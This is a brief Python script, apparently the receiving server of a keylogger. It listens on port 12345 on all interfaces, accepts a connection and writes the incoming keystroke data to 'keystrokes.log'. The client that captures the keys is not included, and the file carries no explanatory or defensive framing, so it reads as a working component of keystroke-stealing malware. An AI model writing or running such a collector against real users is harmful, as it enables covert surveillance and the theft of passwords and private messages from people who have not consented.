import socket


def server():
    server_ip = "0.0.0.0"
    server_port = 12345
    log_file = "keystrokes.log"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serv:
        serv.bind((server_ip, server_port))
        serv.listen(5)
        print(f"Server listening on {server_ip}:{server_port} ...")
        client_socket, client_address = serv.accept()
        print(f"Connected by {client_address}")

        try:
            with open(log_file, "a") as file:
                while True:
                    keys = client_socket.recv(1024).decode()
                    if not keys:
                        break
                    file.write(keys)
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            client_socket.close()


server()
